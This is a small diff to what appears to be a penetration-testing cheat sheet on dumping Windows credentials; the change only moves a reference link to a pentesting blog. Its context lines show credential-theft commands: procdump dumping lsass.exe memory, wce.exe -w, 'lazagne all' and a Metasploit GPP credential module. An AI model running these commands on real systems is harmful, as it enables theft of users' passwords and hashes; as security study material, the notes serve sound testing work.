@@ -39,8 +39,6 @@ procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
 - https://www.ampliasecurity.com/research/windows-credentials-editor/
 
 
-# Reference
-https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
 ```
 wce.exe -w
 ```
@@ -61,3 +59,6 @@ lazagne all
 - metasploit module
 
 ``` post/windows/gather/credentials/gpp ```
+
+## Reference 
+https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
